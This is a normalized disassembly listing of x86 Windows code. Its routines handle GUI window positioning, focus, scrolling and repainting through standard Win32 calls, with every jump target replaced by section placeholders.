call LoadKeyboardLayoutA
jmp r-xdata
sub_4579fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_455640
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_452c94
sub_457a5c
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4551b8
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_454464
pop ebx
retn
sub_457ab4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_458904
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_454464
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call EnableWindow
sub_457b24
push ebx
mov ebx eax
mov eax ebx
call sub_452a3c
mov eax ebx
call sub_458904
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_454778
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_42473c
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_451b4c
sub_457b60
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_44ee0c
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_4585f8
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_451b4c
sub_457ba0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_458904
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4585f8
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_457be0
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_454778
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_458904
test al al
je r-xdata
mov eax [ ebx + 0x1b4 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_4584fc
sub_457c20
push ebx
mov ebx eax
cmp [ ebx + 0x1dd ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
movzx edx [ eax + 0x1d9 ]
mov eax ebx
call sub_4587e4
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_4587e4
jmp r-xdata
mov [ ebx + 0x1dd ] 0x1
sub_457c80
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
movzx eax [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_4515a4
jmp r-xdata
push 0x0
push 0x0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax esi
call sub_4503d4
lea edx [ esp + 0x8 ]
xor ecx ecx
mov eax esi
call sub_455430
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_457d08
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452bf0
mov edx esi
mov eax ebx
call sub_454708
pop esi
pop ebx
retn
sub_457d24
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_44d380
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov dl 0x1
mov eax [ esp ]
call sub_43bd90
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_40484c
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffa5
call sub_40484c
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffee
call sub_40484c
test al al
jne r-xdata
sub_457dbc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_4597b4
mov edx esi
mov eax ebx
call sub_457d24
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_451b4c
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_451b4c
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_451b4c
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_43bd90
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_451b4c
test eax eax
jne r-xdata
jmp r-xdata
sub_457ea0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movzx edi [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_451b4c
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_457ef4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_451b4c
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_43bd90
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_451b4c
test eax eax
jne r-xdata
sub_457f44
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_457d24
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_451b4c
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_43bd90
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_451b4c
test eax eax
jne r-xdata
sub_457fa0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_43bd90
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_451b4c
mov [ esi + 0xc ] eax
sub_457fd4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_458904
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_458904
test al al
je r-xdata
mov eax [ ebx + 0x1b4 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44fda0
mov eax ebx
call sub_45342c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4501b4
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x1b4 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4580b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_4546e8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_4546ac
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_40484c
inc edi
dec ebx
jne r-xdata
sub_4580f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_454204
xor eax eax
push ebp
push sub_458196
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4580b0
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45049c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45819d
mov eax [ ebp - 0x4 ]
call sub_45420c
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x8c ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x242 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x242 ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x246 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x246 ] eax
sub_4581a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x1b4 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_4546e8
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x1b4 ]
push eax
call ScrollWindow
mov eax edi
call sub_45422c
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x1b4 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_4546ac
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x1b4 ]
push eax
call SetWindowPos
sub_458294
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x1cc ]
test edx edx
je r-xdata
mov eax [ eax + 0x1d0 ]
mov edx ebx
call sub_4198f4
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x1b4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x1d0 ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x1d0 ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_41978c
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1d0 ]
mov ecx ebx
mov edx esi
call sub_419914
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_419898
call sub_4585f8
jmp r-xdata
mov eax ebp
mov edx esi
call sub_419898
call sub_4585f8
sub_45836c
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x1b4 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x1d0 ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_458294
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x1cc ]
test esi esi
je r-xdata
sub_4583cc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4585f8
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_4585f8
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x1b4 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
test eax eax
jne r-xdata
sub_458430
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_458904
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_451b4c
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x1b4 ]
push eax
call InvalidateRect
call sub_432228
call sub_432330
test al al
je r-xdata
mov eax ebx
call sub_4546e8
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4546ac
mov edx [ eax ]
call [ edx + 0x80 ]
mov edx esi
mov eax ebx
call sub_4546ac
test [ eax + 0x52 ] 0x4
je r-xdata
sub_4584fc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4501b4
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1b4 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_458534
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov dl 0x1
mov eax ebx
call sub_43bd90
mov esi eax
test esi esi
je r-xdata
movzx eax [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_458574
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_43bd90
test eax eax
je r-xdata
cmp [ ebx + 0x1c4 ] 0x0
je r-xdata
mov edx ebx
call sub_440bd8
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43bda0
mov eax ebx
call sub_4585f8
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_4585b0
push ebx
mov ebx eax
cmp [ ebx + 0x1b4 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x1b4 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4585d4
push ebx
mov ebx eax
cmp [ ebx + 0x1b4 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
call sub_4585d4
sub_45860c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov [ esp ] eax
push 0x0
push esi
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_418448
mov eax [ esp ]
call sub_4546e8
mov edi eax
dec edi
test edi edi
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
mov [ esp + 0x4 ] 0x0
xor edx edx
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ esi ]
jge r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ esi + 0x4 ]
jge r-xdata
xor edx edx
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi ] eax
inc [ esp + 0x4 ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
xor edx edx
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x2
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
cmp ebp [ esi + 0x8 ]
jle r-xdata
mov edx 0x1
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_4546ac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov edx 0x1
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x3
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
cmp ebp [ esi + 0xc ]
jle r-xdata
xor edx edx
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x2
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
mov [ esi + 0x8 ] ebp
mov edx 0x1
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x3
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
mov [ esi + 0xc ] ebp
sub_458740
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_4585f8
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_458778
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_458904
test al al
je r-xdata
mov eax ebx
call sub_4585f8
push eax
call IsZoomed
test eax eax
jne r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4585f8
push eax
call SetWindowPos
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
sub_458814
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x1c8 ]
mov edx ebx
call sub_4198f4
pop esi
pop ebx
retn
sub_458838
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_458814
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x1c8 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_41978c
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1c8 ]
mov ecx ebx
call sub_419914
sub_458894
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4588f8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1db ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4588ff
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
mov [ ebx + 0x1db ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_40484c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x1b0 ]
call sub_407024
sub_458910
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x1b4 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44fda0
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_4589c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x1c8 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x1c8 ]
mov edx [ esp + 0x4 ]
call sub_419898
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_419740
mov edx [ esp ]
mov eax ebx
mov si 0xffb2
call sub_40484c
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_458a28
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_458b1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_40484c
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458b25
mov eax [ ebp - 0x14 ]
call sub_404650
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_4198f4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_419898
mov edi eax
mov eax edi
mov si 0xffb6
call sub_40484c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1d8 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_458b34
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_458a28
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
sub_458b60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4546e8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4546ac
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_458ba8
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_458294
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_450b0c
sub_458bf0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor ebx ebx
mov [ edx ] ebx
mov ebx [ esi + 0x74 ]
mov ebx [ ebx + 0x14 ]
mov [ edx ] ebx
jmp r-xdata
xor ebx ebx
mov [ ecx ] ebx
mov ebx [ esi + 0x74 ]
mov ebx [ ebx + 0x10 ]
mov [ ecx ] ebx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov ebx [ ebp + 0xc ]
xor edi edi
mov [ ebx ] edi
mov ebx [ esi + 0x74 ]
mov ebx [ ebx + 0xc ]
mov edi [ ebp + 0xc ]
mov [ edi ] ebx
jmp r-xdata
